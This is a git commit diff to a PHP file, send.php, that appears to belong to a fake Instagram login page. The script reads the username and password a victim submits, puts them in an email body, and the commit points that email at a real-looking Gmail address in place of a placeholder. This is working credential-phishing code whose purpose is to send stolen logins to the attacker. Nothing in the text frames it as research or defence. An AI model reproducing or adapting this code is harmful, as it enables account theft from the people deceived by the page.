f4206bcecb248d400ec6d2082a0097489b5e4545
conaturalpk-ux <conaturalpk@gmail.com>
2026-03-24 17:57:34 +0500

    Update send.php

--- send.php
+++ send.php
@@ -4,8 +4,8 @@
 $username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
 $passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
 
-$subject = "Someone Login ! Insta Dummy page";
-$to = "xxxxxxxxxxx@gmail.com";
+$subject = "Someone Login ! LORAY LAG GAYE";
+$to = "therajpoot52@gmail.com";
 
 $txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;
 
